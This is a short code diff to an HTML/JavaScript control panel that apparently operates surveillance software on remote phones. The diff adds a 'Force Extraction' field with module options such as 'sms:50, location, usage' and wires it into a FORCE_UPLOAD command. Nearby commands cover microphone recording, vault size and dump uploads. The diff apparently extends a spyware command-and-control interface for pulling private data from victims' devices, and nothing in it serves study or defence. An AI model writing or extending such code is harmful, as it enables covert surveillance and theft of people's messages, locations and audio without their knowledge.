@@ -312,9 +312,13 @@
                         <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Set</button>
                     </div>
                 </div>
-                <div class="input-wrap" style="margin-top:10px;">
-                    <button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
-                    <button class="btn" style="flex:1" onclick="sendCmd('FORCE_UPLOAD', 'ALL')">Emergency Cloud Sync (ALL)</button>
+                <div class="cmd-row">
+                    <label class="cmd-label">Force Extraction (Modules:Limit)</label>
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
+                        <input type="text" id="val-force" placeholder="e.g. sms:50, location, usage" value="ALL">
+                        <button class="btn" onclick="sendCmd('FORCE_UPLOAD')">Extract</button>
+                    </div>
                 </div>
             </div>
 
@@ -502,6 +506,8 @@
                         content = document.getElementById('mic-dur').value; break;
                     case 'GET_SKELETON':
                         content = document.getElementById('val-skeleton').value || '5'; break;
+                    case 'FORCE_UPLOAD':
+                        content = document.getElementById('val-force').value; break;
                     case 'GET_VAULT_SIZE':
                     case 'UPLOAD_DUMPS':
                     case 'GET_LOGS':
